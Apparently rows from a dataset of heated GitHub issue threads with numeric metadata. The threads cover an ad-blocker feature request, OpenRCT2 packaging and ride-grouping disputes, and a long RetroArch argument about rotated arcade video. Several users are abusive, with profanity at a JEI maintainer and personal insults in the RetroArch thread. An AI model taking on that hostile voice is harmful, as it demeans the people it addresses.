banning you from my issue tracker. Please respond in a less pedantic way.  Keybind o to hide all JEI not just the left pannel that mods add. Your currnet setup in your JEI keybinds that I saw said to hide something and that something with addon was left pannel by itself it did nothing without any addons.  FUCK YOU YOU DON'T FUCKING READ SHIT IT SAYS RIGHT SIDE THE RIGHT JEI PANNEL NOT PATHETIC  In your original post it says Pedantic does not mean pathetic, look it up. I think you are the one who isn't reading carefully. Goodbye.  ok well actually this is a seperate issue control + 0 did hide it but, with the addon it wasn't weird maybe if you just told me it does hide the pannel with control + o to the right I wouldn't have been pissed sorry   The very angry comment was deleted but I'm not putting up with that, I've blocked him now. / ",7,2,49,0.14285714285714285,0.32142857142857145,125,1,
NanoAdblocker/NanoCore/87,0.1465989475,NanoAdblocker,NanoCore,Disable specific filter on single site,6137,66,18,0,1,"i think this is the best enhancement  I don't see a reasonable implementation of this...  Filter lists can limit the amount of domains each rule apply to with many ways. If you need to set a different set of filter lists for each domain, then chances are the filter lists you are using are kind of broken.  And there isn't a reasonable way to swap filter lists sets internally.  it depends on how the internal data structure of the core looks like if the rules still have a reference to the list they came from then it shouldnt be too hard to just ignore them on a specific website just like you can switch off blocking completely for a site. if the internal structure is just a huge merged and optimized set of rules, which i assume is the case, then you would have to rebuild that internal structure once you click on that button or when you later load that site again or if you leave and all filterlists should be on again. if the performance hit is too great then there are two ways to deal with it. generate an internal structure for each new combination of active lists and keep it for later or use the normal datastructure when all lists are on and if one or more are disabled then execute each least sequentially. this could behave differently than a combined list, like you mentioned, so maybe some sort of hybrid would be needed. so, yeah, not an easy task if my assumptions about the project are correct. but it would still be a very worthwhile feature that you shouldn't give up that easily. maybe gorhills rework of the engine makes this easier to implement.  Whitelist just completely disables filtering, that's different than disable one specific filter list for that domain. Currently, if I understood the code right, each filter list will be compiled separately and stored, all selected filters are merged together. The merging process need to be done every time a filter list is turned on or off. There are also snapshots of internal states for fast startup. I can't think of a single use case. Did you spelled ""harder"" wrong?  i dont think he wanted whitelisting. if you have experimental or generic filterlists that work well most of the time but occasionally break sites then you want to quickly disable the list for this specific website but not in general and you do not want to go through the dashboard every single time you visit that site again. you should also contact the maintainer but it will take time until it is fixed. you could even just move along and after a few weeks you look up your dynamic rules and post a bug report with all the problems you collected over time but were too lazy to report at that moment. well, unlikely but at least possible  Just override the rule with your custom filters, that's what it's for.  while still a lot more work than 2 clicks i could do this. most people wont. blocking something with the element hider is something many would be capable but figuring out an exception rule is too much for casual users who just set it up, tweak a few options and select and install a few lists and then call it a day. not everyone is going to read the wiki about the filter syntax and then debug every page that causes problems. giving them a better option than having to switch off Nano Blocker entirely or uninstalling a list just because of one or two false positives would really add some usability benefit.  If you are a casual user, chances are you won't be adding filter lists other than those that come with Nano Adblocker.  If you are a casual user, chances are you won't be able to know which filter list you have is causing the problem.  If you can find out which filter list is causing the problem you will be able to set up the exception filter. If you absolutely need to toggle between two sets of filters, use browser profile. This is non-trivial and only has theoretical use case, I'll decline this feature for now.  What I will do is to add a button in Logger that turns off a rule.  mayby quick access to off specific rule on single site example.   If you find yourself have to toggle a filter list frequently, then you probably need to figure out what exactly is wrong.  you do not only want this when something is wrong. maybe you have a list that implements a night mode and you personally do not want it on a specific site or a floating header that you want for some special use case or you want to allow ads for a site but not tracking and annoyances.... besides that it is great for trouble shooting. you turn off lists as long as the site works again. then you immediately know who to send a bug report to.  If you need a night mode or any other mode, use browser profile.  For trouble shooting, use the Logger.  make a browser profile for every website? thats not practical. you do not need that many tries if you always the disable half of the remaining ones. ~log2(n) turns.  an ordinary user will not be able to and will not want to look into the logger.  like this?   You do realize there are over 100 000 rules enabled by default right?  on single site?  O  There are well over 10 000 rules affecting every single site. A lot of generic rules in EasyList.  hmm.. you can segregate this rules to category and hide  gorhill has his decisions, I have mine. If you disagree with both, then you have to look for another fork, or fork yourself, then you don't need to convince me to implement the feature. Maybe we have a different definition of ""casual user"", but I don't think any of the proposed feature is useful. If you need a per-site profile, then chances are you are not a casual user, and should use a custom filter list for that.  Listing active rules on the popup will definitely not be easier to use than the Logger, and casual users cannot understand what they are seeing. If Logger is too complex for them, putting a smaller Logger in the popup will just be worse. I'm not sure what that means, you are welcomed to teach me how to code, but do so in Pull Requests.  I'm locking this as it's not getting anywhere, if you truly believe this feature is necessary, please Pull Request, I can test out the result and maybe I will change my mind. ",31,7,127,0,0,53,5,
OpenRCT2/OpenRCT2/7186,0.037171183999999996,OpenRCT2,OpenRCT2,OpenRCT is not working on Debian Buster because of libpng12 (and probably other distros),5785,55,44,0.4583333333333333,12," OS [Debian Buster] Version [0.1.1] Commit/Build [4601265] ./openrct2 error while loading shared libraries libpng12.so.0 cannot open shared object file No such file or directory  [x] Reproducible in RCT2 (vanilla)? [ ] Multiplayer?  Steps to reproduce  Trying to run it praise  Notes 6697 is known to me and a clutch and not a solution Please, Please use AppImage to be less of an headache for 80 of the Linux Community  be linking to  and calling @friend for help  There is already  can you please detail what are the differences between the three available formats? Getting it packaged as snap required just a few minutes and a handful of lines in  (which I don't think I have handy right now) and I worked with upstream developers to improve Arch (my distro of choice) support, which was the major roadblock when the issue was filed. Please also take a look at  /  simply not true. Your  may be unable to do that, which is a deficiency of your package manager, but there is nothing stopping users from installing .  Ubuntu AND Debian (stable) already dropped support for that obsolete version of libPNG solution provide this obsolete version with the software (with appimage, flatpack, snap) or upgrade to the new version that offically replaces it. Again, there is a difference between a ""kludge"" and a ""solution""  How about you approach us less aggressively? Do you honestly expect us to help you if you're talking to us like that? In any case, we still compile against libpng12 because of Ubuntu 16.04. That will most likely change when Ubuntu 18.04 comes out.  i dont see a reason to wait that long, ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian  and sorry for that ""aggressiveness"", i have mental issues and lose myself quickly  Ok, thanks. ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian Our CIs run on 16.04 and non-LTS images are not available. Furthermore, while libpng16 and libpng16-dev are available, attempting to install them means removing libfontconfig1-dev and libfreetype6-dev, both of which we need.  what are the consequences of them being disabled?  Said Debian user.  libpng 1.6 was first released 2013-02-14 and it only took 4 years for debian to notice  and  don't see what's the sudden rush all about. You're welcome to compile openrct2 on your system and we will properly use libpng 1.6. We will gladly accept any help to improve the situation, which you so kindly offered, but in the meantime I would suggest you tone down your demands a bit, as you come through as overly aggressive. See  for rough idea of how the upgrade of relevant CI jobs to 18.04 is meant to look like (TL;DR switch as soon as it's out)  yes, want to keep my system clean of kludges, i was forbidden to tinker with it unnecessary  Well, we can't compile without libfontconfig1-dev and libfreetype6-dev, unless we disable TTF rendering. But since normal builds have TTF rendering on, this is not a good idea - it means bugs can easily go unnoticed. Anyway, openrct2 can be compiled against libpng16, in case you compile stuff yourself.  i hate compiling, i am not a dev (yet), just an annoyed user that wants to play this game  Well, we have given you a number of workarounds. It's up to you if you want to use them or not.  then i would probably try the Android version instead  congrats, the android version is playable,  i really hope you make the Linux version easy to use soon  @friend you can try using the packages from launchpad  @friend i use Debian, i wrote that in the issue  That's completely not true.  i read that on the Debian Wiki, and i won't corrupt my system because some stranger told me to do... i am an end-user, i want a properly packaged version of this game to be able to play it, like everyone else does that successfully but OpenRCT2  The obvious solution for you @friend is to run vanilla under wine or a windows VM until OpenRCT2 can be updated since you seem paranoid of contamination. (it's highly unlikely that you would break something by compiling this yourself. And that's why we have backups.) By the way, the second portion of your last post seems cut off.  i use wine for it already (which is sad)  Ultimately it's up to you to use the builds we provide.  @friend  how that??? the builds that youn provide dont work  This discussion is getting pointless. You said yourself you refuse to use the builds we provide  the ppa builds are made for Ubuntu  Why did you report the bug in the first place then?  because your build does not work on my os  This is getting ridiculous. So you try a build done on Ubuntu and file an issue but refuse to try use another build on the grounds ""it is not your OS"" and keep on whining how you refuse to apply the fix… so why did you file the issue in the first place? There are fallacies in your arguments. As I said earlier  @friend we do not support Debian, for Linux distros it is up to the community to provide packages through the package manager of the distro. We do not have the manpower to provide specific builds / maintenance for every distro as they are far too many and they all have their subtle differences. You can either use a supported OS such as Windows or Ubuntu 16.04 or ask someone in the Debian community to provide a package for OpenRCT2.  Look, we have suggested several options. You have dismissed most of them. That's not helping. And while I'm not completely happy how @friend handled some stuff here, you're not conversing in a very pleasant way either. In any case, this has gone out of hand, so I'll have to lock the conversation.   migrated our Ubuntu docker images from Ubuntu 16.04 to Ubuntu 18.04, our future builds will be using that as a base ",18,10,182,0.16666666666666666,0.3333333333333333,133,11,
OpenRCT2/OpenRCT2/7365,0.14349963,OpenRCT2,OpenRCT2,Cannot Switch Ride Building Screen from Group By Track Types to Group By Rides,4006,44,21,0.2857142857142857,1," **OS** Windows X Sixty Four Bit (laptop) **Commit/Build** AA7FB35    Good evening. The issue I am experiencing concerns a preference pertaining to the sortition of all available attractions and rides. By default, there are entries for each ride as written in RCT2. The Vintage Cars get one slot, the Car Ride gets another, and so on, despite sharing the same track. There is a secondary option, which combines the rides and groups them by track type. This forces the Vintage Cars and Car Ride onto one slot, the Steeplechase and Soapbox Derby rides into one slot, and so on.   [ ] Reproducible in RCT2 (vanilla)? [ ] Specific to multiplayer?  Steps to reproduce     Dump file  Screenshots / Video  Save game   The old sorting made little sense the racing cars, sportscars and trucks were put together, but the cheshire cats and vintage cars were not. In addition, the old approach also restricted access to several track pieces and made it impossible to switch vehicles afterwards. I'm afraid we're not going to revert this decision. The RCT2 mechanism was disliked by a lot of people and supporting both means more complexity.  Both were supported for a long, LONG time. Continuing that support would require no significant effort. Forcing your will on others who prefer the other system is wrong. I am not asking to change it back or make the correct version the default. I just want to be allowed to choose. I deserve a choice. Playing the game with tracks crushed together is very difficult for me, because I can't remember what I've selected or where. Not everyone plays the way you do. I deserve a choice, and I am sure the others who use the default system would be mad as well. Railroading your personal preferences on others is a mistake.  This mechanism was liked by a lot of people, too, given it was the way we played it for about twenty years! You can maintain choice, and the choice was already implemented! It's a matter of not wanting to.  You can always just play with an older version if it's that much trouble, can't you?  I've seen them implementing their own object files and stuff lately and so I would guess that maybe since they're doing that it's changing how the codebase works and it would take extra effort to support both methods going forward.  You already made your choice to use OpenRCT2 instead of vanilla RCT2. You've gotten used to the way vanilla RCT2 handles things, OpenRCT2 changed it (and not just because it can be changed), and then you complain that it has. You can always use an older build from before, or play vanilla instead. By all means, feel free to fork this project and revert the commit that changed the behaviour, then play with your own build. So there are plenty of choices you can make.  @friend That, combined with the fact that the current system had matured enough, is indeed the reason we removed it. We created a new object format and we weren't going to support all of RCT2's cruft. @friend Oh, of course, you know this better than someone who actually maintains the software. If it would require no significant effort, then please do what @friend suggested and maintain your own fork with this feature put back in. Prove that I have no idea what I'm talking about if it's this easy. Hell, if you know better than we do, why don't you just go ahead and fix some of the bugs we have a hard time fixing? Why do you deserve a choice? How much did you pay for OpenRCT2? How much do I get paid for working on it? You have an awfully big mouth for someone who got all of this for free, especially considering I am investing a lot of spare time into this without any financial gain. You have no reason to demand we put this feature back, and especially not with the tone you're using. You don't have to like our decisions, you can discuss it with us, but the very least you could do is to treat us normally. I wouldn't tolerate this if this were a paid game and I got a salary from it, so I'm certainly not going to tolerate in these circumstances. ",16,4,122,0.2857142857142857,0.42857142857142855,119,9,
libretro/RetroArch/8551,0.43871815999999997,libretro,RetroArch,Width and height are switched when a vertically-oriented game is loaded ,29134,255,155,0.5,6,"Description With vertically oriented games, Retroarch switches the emulator-provided width and height. For example, if the width/height is supposed to be 320x240, RA will switch this to 240x320. This only occurs with vertically oriented games. I tested this in both MAME and FBA using the Windows 64 bit version of RA. Expected behavior The game to be displayed using the correct resolution (width/height). Actual behavior The height and width is switched when a vertically oriented game is loaded. Steps to reproduce the bug  load any vertically oriented game in either FBA or MAME using Windows 64 bit version of RA. under video settings, enable integer scale.  set ""custom aspect ratio width/height"" to 1x. look at ""custom aspect ratio width/height"" to see that it says 240 for width and 320 for height. This is the reverse of what it should be.   Bisect Results I first noticed this a few days ago. Version/Commit You can find this information under Information/System Information  RetroArch 1.7.6 Git version 9750719074  Environment information  OS Windows 10  Compiler NA     some arcades have the monitor rotated 90 degrees. The  can the emulator can either rotate the image to the displays orientation or display it as intended and you rotated your display 90 degrees  I understand that, but the emulator-provided resolution should not be changed from the correct resolution, regardless of orientation. If the game is 320x240 it should be output as 320x240, not 240x320. The user can flip it or rotate it or resize it or whatever, but the output resolution from the emulator should remain the same (eg, 320x240 should be output as 320x240 before the user does stuff to it). Otherwise you get scaling artifacts unless you just happen to adjust the y axis to a multiple of both 240 and 320 (eg, 960). And if you’re playing a game that uses a weird resolution like 19XX (384x240), then it causes big problems with overscan or underscan when using integer scaling. As of right now, video aspect ratio for vertical games must be configured manually (custom ratio width/height, non-integer) along with custom ratio x/y position, because the resolution/ratio for vertical games isn’t being detected correctly.  the thing is the topic say the width and height are switched they simply arent it just a rotated monitor. It draws the image on the monitor as 43 then you flip the monitor physically this changes it to 34 on real hardware as far as the hardware is concerned its a normal 43 device but your rendering the image 90 degrees rotated. In mame2003 or plus just use tate mode this stop the rotation and you need to flip your monitor like a real one. look at sf2 this is on a 43 screen look at the resolution of the game it use crt timing when rendering to look the way it does in a crt if you used the literal resolution for sf2 the gfx would be overly stretched.  it looks like your talking about capcom games watch this to understand whats going on and it is indeed 43  I’m not referring exclusively to capcom games. You can see this behavior in the example screenshots I posted above, which are from Donpachi. I understand very well that certain games are meant to be displayed vertically. This doesn’t change anything that I’ve said. With a vertically-oriented 320x240 game, width should say 320 and height should say 240, and the displayed image should be sideways. On a 43 CRT monitor the image would be 320x240 and sideways. You then rotate the monitor 90 degrees. This doesn’t change the image to 240x320. It is still 320x240 but now it is rotated 90 degrees so it is no longer sideways. Altering the internal resolution of the game is incorrect, and will always result in scaling artifacts unless you happen to use a resolution that is a multiple of both 320 and 240.  If you display the arcade pcb to a CRT monitor in normal orientation it will be a 320x240 image that is sideways. You rotate the CRT 90 degrees. The resolution of the game remains unchanged.  yes resolution of you display remains unchanged. I dont have a crt to test whats going on there I would assume you should be using core provided information and tate mode on for mame2003 and plus dont know if the others support tate mode  You just aren’t getting what I’m saying. I’m going to have to post some screenshots later to help illustrate what’s going on currently and what should be going on instead.  can you make them screenshot in mame2003 and 2003+ with tate mode on so i can see what going on make sure your using core provided for aspect ratio as well in them screenshots will help a lot in seeing whats going on  First of all, just look at the first two screenshots I posted above. See where it says ""custom aspect ratio width"" and ""custom aspect ratio height""  Both of these screenshots were taken with video rotation disabled. Width/height should be the reverse of what is shown in the above screenshots.  Here is what it SHOULD look like with video rotation disabled. This is what is NOT happening, currently. I created this in GIMP by manually switching the height/width in GIMP.   Here is what currently happens. Both of these are incorrect. video rotation disabled  video rotation enabled   Next, here are some tests conducted by HunterK. See how video height/width are switched from what it is in my screenshots in the very first post? That's what it should be.     what emulator is this from here is screenshots from with ?  Next, I made this shot by manually resizing the resolution to 1600x1200, and used a scanlines shader. Notice how the scanlines and mask are perfectly scaled with no scaling artifacts present. This could only be the case if the game's resolution is indeed 320x240. With the currently reported resolution of 240x320, you get scaling artifacts.   I already said what emulator is being used in my initial post. The behavior is present in both MAME and FBA in the Windows 64 bit version of RA. As you can see in the tests conducted by HunterK, this behavior is not present in the Linux version of RA.  this is mame2003 with tate mode on and off using core provided aspect ratio I cant speak for the other emulators    ....How is this helpful?  have you even tried running mame2003 with these settings it what it shoud do tate mode skips the rotating and renders like its should.  How are we supposed to know what the core reported width and height are from the screenshots you just posted? Again, the issue is that the emulator reported height and width are not correct.  Tate mode ON solves the issue in MAME 2003. Tate mode off  Tate mode on   i think mame current has rotation options in the tab menu dont know if they will work as expected though  The problem is, tate mode ON in MAME 2003 should be the default for all emulators including FBA. This is what the image looks like when you connect the actual hardware to a CRT that isn't rotated. There shouldn't be any automatic switching for vertical-oriented games. Switching height/width (Tate mode off) should be something that the user has to select because it's altering the original output of the emulated hardware. Anything done to alter the original output of the emulated hardware in this way should be something that the user has to manually select. Still no idea how HunterK was able to get the image to to display correctly using FBA, and I'm still unable to get the other version of MAME to display the image correctly.  sure that can be true im sure most people dont have there displays rotated unless they have a barcade of some sort setup for vertical games only. Its  a personal opinion but feel free to post an issue on it is easy enough to change the defaults through issues in the emulators in question. I dont really feel strongly about this its one for the people in charge of the repos it switchable in mame2003 and plus anyway in the options so the default wont really matter it can be changed to suit your display  I'm not just being pedantic, here. The width/height being switched isn't helpful and causes numerous potential issues. With the current behavior of height/width being automatically switched with vertical games, you still have to rotate the image if you want correct aspect ratio and orientation or to avoid a huge amount of letterboxing, and with height/width being switched like this, it results in scaling artifacts unless you happen to choose a resolution that is a multiple of both 320 and 240. Furthermore, there is still no way that I know of to get any emulator besides MAME 2003 to work correctly. The current rationale of ""people don't want to rotate their displays"" just isn't sufficient to justify this.  first of all i completely agree with you all options should be clear to change and i feel fba does cover this option well its just you have to restart for it to take effect/ ill need to look into mame current at a later time. I will tell you how to to fix fba got quick menu options turn vertical mode on and restart the emulator it should work as expected.  In FBA, enabling vertical mode in the quick menu options and restarting the emulator does not fix the problem. I'm still getting this   Another problem related to this is the sheer number of knobs and dials related to video rotation. There are options related to video rotation in all of these places main menu -&gt;quick menu -&gt; options settings -&gt; video settings -&gt; core If I'm an average user, how am I supposed to know what to do with all of this? Even as an experienced user, this is quite confusing.  SUCCESS. Actually, in FBA I have to turn vertical mode OFF under quick menu -&gt; options.  So, yes, there is a lot going on here. Each of the cores seems to be handling this in a different way and there are far too many knobs and dials related to this. Disabling vertical mode makes it work in FBA, while enabling tate mode in MAME 2003 makes it work there... how does that make any sense?! As things currently stand, the options for this are an incoherent mess. Even you thought that enabling vertical mode would be the same as enabling tate mode, which makes sense, intuitively. There just seems to be no rhyme or reason to the way these settings currently work.  I'm still getting the same problem in FBA 2012. There is no option in quick menu -&gt; options for vertical mode. Under settings -&gt; core there is an option for ""enable rotation."" I'm getting the same results with this turned either ON or OFF. settings -&gt; core -&gt; allow rotation ON  settings -&gt; core -&gt; allow rotation OFF   as far as I can tell, the problem is the frontend based rotation not taking into account the aspect ratio change. I don't think we need so many knobs in the cores to do this, it should be one option in the frontend and that's all. I'm not even sure why there is a ROTATION ENV callback in the API  there is a reason for it to be there clearly this isint a front end issue. It cant guess if you have rotated you monitor 90 degrees physically you need to deal with this as a core option if that is the case.  Agree w/fr500. In my opinion, a vertically-oriented game should look like this by default  The user can then rotate the image using the advanced user option under settings -&gt; video -&gt; rotation You could also add an option under video settings (""automatically rotate vertical games 90 degrees"" or something) to automatically set settings -&gt; video -&gt; rotation -&gt; 90 degrees whenever a vertical oriented game is detected. But, I'm getting ahead of myself.  You're missing the larger issue which is that the emulator isn't always using the correct resolution. The resolution/aspect ratio should remain unchanged regardless of rotation- see above. A vertical game that is 320x240 should be output as 320x240. The frontend option for video rotation is more than sufficient and solves the problems related to the way things are currently handled, which are, to wit  it's incorrect according to what the original hardware does it's counter-intuitive  it results in scaling artifacts with integer scaling   and how is the front end supposed to guess that this particular arcade is rotated or not mame2003 covers this i dont see how you can get the front end to be psychic  I'm saying that the front end options are sufficient and that the cores are currently doing something wrong/there's too much going on with the cores. Just make the cores output the original resolution, unaltered, and let the user use the frontend options for rotation and aspect ratio. That would solve the problem(s). In standalone FBA, you get this by default, which is as it should be  With ""Video -&gt; rotate vertically aligned games -&gt; enabled"" you get this, which is again as it should be   ok with you so far you failing to mention the users monitors physical orientation in all this  I don't see why the monitor orientation is relevant to what resolution the core is outputting. Altering the height/width of the resolution so that the image is correctly oriented on a non-rotated monitor is altering the output resolution, and thus incorrect. The core should just output the unaltered resolution. Altering the resolution, aspect ratio or video rotation is all stuff that should happen on the frontend or through a user option that has to be selected.  Also, as we can see, there's just a lot of weird stuff going on. TATE mode ON in MAME results in the same behavior as vertical mode OFF in FBA, and FBA 2012 won't display a correct image no matter what settings are applied, and I haven't even tested all the emulators yet. I understand the lack of standardization when it comes to core options, but this just seems somewhat ridiculous.  im trying to understand where you are hitting this from the cores arent scaling the resolution RA scaless the resolution to your display.  To what are you referring with this statement?  If the front end can't detect whether a game is vertical or not, then it's the cores that are automatically switching the height/width for vertical games.  yes they do people that dont rotate there monitors dont want to play there vertical games sideways or rotate there monitor by default.  Tate mode wont rotated vertical games at all on mame2003 that what you requested.  This whole discussion is pointless. There is not need to guess anything, this is software development, there is an API, an implementation, and a frontend. There is an API for this  the players are  core api frontend  Who knows the content needs rotation? The core does. The environment callback is a set, which means it's telling the frontend to ""do something"" So what should happen could go two ways a. The core tells the frontend ""hey video is rotated, adjust aspect ratio from what I reported accordingly"" b. The core tells the frontend ""hey this content requires rotation, do whatever you need to do so it works properly"" That's all. This is a frontend problem, but before anything can be do about it what we need is clarification from the API side so we can adjust both the frontend and the cores to do whatever needs to be done. That's all.  there is no front end issue some arcades have different rotations not just 90 degrees. The core needs to work this out the user will need to be more specific from what he says he wants vertical games to display like this by default  which is perfectly valid if you have a rotated monitor.  this is how it displays when you dont have a rotated monitor the user seems to think this is wrong   Ok, you win, have fun arguing forever instead of proposing a solution.  Ok you have a 43 monitor it draws as 43 like the fist picture you rotate it the monitor in the arcade 90 degrees what aspect ratio is it now for us to display on out normal monitor sitting on the tv stand? ill leave you two to it  I don't understand all of this, but it sounds very reasonable. Yes, it does seem grant2258 and I have been going in circles with this. I think I've provided enough info on the problem as it currently stands to work towards a solution, but since I'm not a programmer, I've probably done all I can by this point.  i agree with that  @friend  im sure @friend has some idea looking forward to seeing what he is going to do since he thinks there is an issue and what exactly is wrong as i cant see any issue at all with mame2003 or fba on libretro it both have the ability rotate or not rotate vertical games. It does it the same way as mainline fba and mame. So i wll digress im at a bit of a loss what you two seem to think the issue is is you want to maintain a 43 ratio you need to rotate the Monitor or physically force the aspect ratio to 43 when rotating and put up with the streched gfx  The issue is that the behavior isn't consistent across cores and it's confusing as hell what is actually going on. There is the separate issue of what the default behavior should be for vertical games, which you seem to be caught up on. As of right now, MAME and FBA do the exact opposite thing with video_allow_rotate = true/false. And that's just two cores. Who knows what's going on with other cores; I haven't even had a chance to test them yet. TATE on and video_allow_rotate = true in MAME 2003 produces the same results as vertical mode on and video_allow_rotate = false in FBA. How does this make any sense? posting this for reference, read from this post down.   automatically switching the width/height for vertical oriented games is altering the output resolution, which is incorrect. The emulator should just output the resolution completely unaltered. Altering what is output by the emulator should always be done by the frontend, or through an option that the user has to manually select, but maybe that's just my opinion. The default should just be whatever the emulator spits out before you start doing stuff to it.  rotating the game is something that can be easily handled in the frontend without all of the confusion that currently exists  2 is something that can even be done automatically if desired by the user, through the frontend as explained by fr500.  the current method of automatically switching the height/width with vertical games will always result in scaling artifacts no matter what you set the aspect ratio to (unless it's a multiple of both 240 and 320). How can this be considered correct?  the current method of automatically switching the height/width of vertical games isn't even making things easier for the user in all cases, because video_allow_rotate = true/false isn't doing the same thing in all cores. The current method is just adding more confusion.   My brain is tired. Hopefully the thread I linked to above sheds some additional light on the problem.  IMO Standalone FBA does things right. See  default it's sideways and 320x240, and there's a clearly labeled and easily accessed option to rotate video under the video menu. There should be a way to make RA work the same with all cores using one of the methods @friend described (it may need either a or b depending on what the core is doing). You could then add an easily accessed user option to automatically rotate vertical games. Or we could just endlessly debate what the default behavior should be when launching RA for the first time.  Ok here is the screenshots with you information the core geometry is reporting the right resolution  Ra  I'm trying to figure out the point you're trying to make. If you're still arguing over what the default behavior should be when launching RA for the first time, I'm done with that conversation.  you rotate 320 x 240  image 90 degrees is becomes 240 x 320 thats as simple as you can describe it  Who is disputing that? What is the point of this?   Yes, and how do you think what you just said contradicts this statement? I think there is a language barrier here that is preventing meaningful discussion.  that was you that it in your first post   your rotate an images the 90 degrees THE x /y swap  Furthermore, the conversation has progressed quite a bit beyond the initial post. If you had been keeping up with the conversation you'd realize that the real issue is a lack of consistency between cores when it comes to the options related to video rotation. I am 100% done debating with you what the default behavior related to video rotation should be. It doesn't matter what the default behavior is. There are pros and cons to having rotation on or off by default and ultimately it's just an arbitrary decision that has to be made. What matters now is getting consistent behavior across cores and removing unnecessary knobs/dials that just lead to more confusion. @friend already outlined the solution and what he needs to implement it.  I literally can't even tell what you're trying to say, here. I'm sorry, I really don't want to offend but the language barrier is just too much to deal with. I feel like you just consistently fail to understand the point being made and respond with irrelevant information most of the time and now I'm just wasting a lot of time trying to clarify things to you. I appreciate that you're trying to help, but we haven't been getting anywhere for a while.  i literally cant even figure your problem out the games will show sideways if they arent rotated. mame fba and lr cores do this. So i guess i leave it at this not wasting more time on you back tracking it not a good default leaving vertical games sideways. Something you claimed fba done  did you even bother following the steps I listed to reproduce the bug? Or bother looking at the discussion at the libretro forums? There is most definitely something weird currently going on with video rotation and height/width being switched. It's not a problem present in all cores. Rotation behavior is not consistent across cores, for the nth time. That's probably the main problem. FFS, the screenshots I provided prove it! Facepalm. Here, to make things even clearer    you rotated the image  what do you expect to happen? you screen shots prove nothing accept the video is rotated and not rotated.  fba and mame2003 create the same images  That's exactly what I expect to happen. Do you see that you're just not following what I'm saying very well?  No they don't, and I've provided numerous examples demonstrating this.  I guess you dont get it when you rotate the video it becomes 34 proof is in the screen shot from fba rotated. it 240 x 230 as well not wasting any more time repeating this   Read this thread, from this post down to the end. Others clearly recognize that there is an issue.   just go away. You aren't getting it and I've reached the limit of my patience with this.  is fba wrong as well. Ive lost my patience with this as well.  From the thread I just linked to, above So, yeah. It's not that you're wrong, it's just that you never quite understood what the problem was in the first place. Thankfully, the issue with FBA was recognized and corrected by BarbuDreadMon.  sending the wrong geometry form the core to fix it i would say thats out of spec and a patch. im sure mark will patch mame2003 and + up to send wrong info so it works in mame2003 and plus. Its trivial to do never the less i wont be changing is as its out of spec to whats really happening. no matter what your little numbers say the resolution is 240 x 320 when rotated )  i can explain the reasoning behind TATE mode core option in mame2003 the emulator sends two bits of information to the retroarch API; the games width and height, and how much it should be rotated so, for a typical arcade game, that would be width 320 height 240 rotation 0 (none) now, for a typical arcade vertical game (which were rendered sideways, and then the CRT was rotated when put in the cabinet), that information would be be width 240 height 320 rotation 1/3 (90/270 degrees) the issue is, retroarch uses the sent height and width regardless of whether it has been rotated or not. so, the emulator has to send the width and height of the game on the presumption that the rotation has happened. so, if you set  you will get an unwanted result ♠video_allow_rotate = truevideo_allow_rotate = falsevideo_allow_rotate = falsevideo_allow_rotate = false`)  (PS, screenshots from behaviour of mame2003 for a year or so ago, and retroarch 1.3.6 - this is what i originally designed TATE mode on - someone else rewrote TATE mode in 2003 so it instead does the rotations within the core itself - personally i think it should all be handled in the front end) so hopefully that shows the issue that TATE mode was trying to solve. IMO there's some better solutions 1) the API lets the core find out what video_allow_rotate is set to. that way, it can send the appropriate height/width for the situation. 2) rotation of 1 (90) or 3 (270deg) also flips the height/width. this would be my preference. i haven't really thought about the ramifications of these! )  there is also some interplay with aspect_ratio that I've forgotten the details about.  the front end is still doing the rotating in mame2003 the fix is trivial your just dont swap change the x/y (like you should be doing in the core geometry).    rotate anything manually the geometory x/y in the menu doesnt change.  No one ever disputed that the correct resolution is 240x320 when rotated. What's being disputed is whether or not all the cores are reporting the correct resolution when the image is rotated. You really are failing to grasp what's going on, here. Numerous people have since recognized the issue I'm describing and the issue in FBA was both recognized and fixed. The fact that you're holding firm on this even in spite of this indicates either a willful stubbornness on your part to admit that you're wrong, or just a complete misunderstanding on your part. There are numerous ambiguities and equivocations occurring in this conversation which make it very difficult to have a meaningful discussion with you. In fact, on more than one occasion you seem to think that I'm arguing for the exact opposite of the point I'm trying to make. The question of what the default rotation behavior should be for vertical games is almost trivial. It literally only matters the first time RA is launched, after which the user can set the behavior in the frontend. The MAIN issue is getting consistent behavior across all cores, regardless of what the default behavior should be. Now, if we're discussing the SEPARATE issue of what the default behavior should be or what is technically ""correct,"" I've already said what I'm going to say about that. You can either respond directly to the points I've made or continue ignoring them, either one is fine by me. Both standalone FBA and now also the FBA core do exactly what that they should be doing by enabling rotation in the core options and enabling vertical mode in the quick menu core options, you get the correct image, which looks like this   @friend clearly in not debating with you and your screenshots anymore. you clearly dont understand geometry when a rotate happens. Im not wasting more time on it with you. No offence i posted a fix details for mame2003 and plus to send this bad geometry clearly you dont understand this at a level beyond screenshots.  As for tate mode in mame2003 and  plus is a ccw 90 degree rotate (it was renamed to what it is now from that) so if the arcade is 90 or 270 it will rotate the same way if the user has there screen rotated in a barcade/ servo/ stand setup . If you want a no rotate option youll need to post a github issue to get it added  why is this still going on. The problem was AR not being updated when using some rotation option (there are at least 3 ways to achieve rotation in RA) @friend I just noticed you are setting aspect ratio to 1. Why? aspect ratio should be core provided.  to sum it up its to do with core rotating an image with ra the cores info updates the rotated geom. RA doesnt like it or update geometry when you do a manual rotate itself.  So you have to return the original orientation even when you rotate through RA with the core.  all mame cores will need updates or ra should report rotated geometry.  @friend You are completely hopeless. Several other devs agreed that there’s an issue, FBA dev already agreed that there is an issue and fixed it In FBA. To deny that there is an issue at this point is pretty much insane. I’m done talking to you.  @friend, yeah I don’t know why this is even still a discussion. I’m at a loss. I use custom aspect ratios with RA because I overscan some games that scale to 1120 on the y axis. Switching it to core provided didn’t change what was going on with the reported width/height and rotation, as far as I could tell. Anyway, the issue in FBA was fixed yesterday so I think this issue can be closed; rotation behavior appears to be consistent, at least from the user’s perspective. The issue of how to best handle rotation is really a separate topic that probably warrants its own issue.  @friend ive already done the fix for 2003 and plus linked it and described the issue you are either stupid or argumentative or clueless about whats going on i think the latter )  @friend Let's please keep this respectful at the very least. That last line was unnecessary. ",105,70,700,0,0.5,592,22,
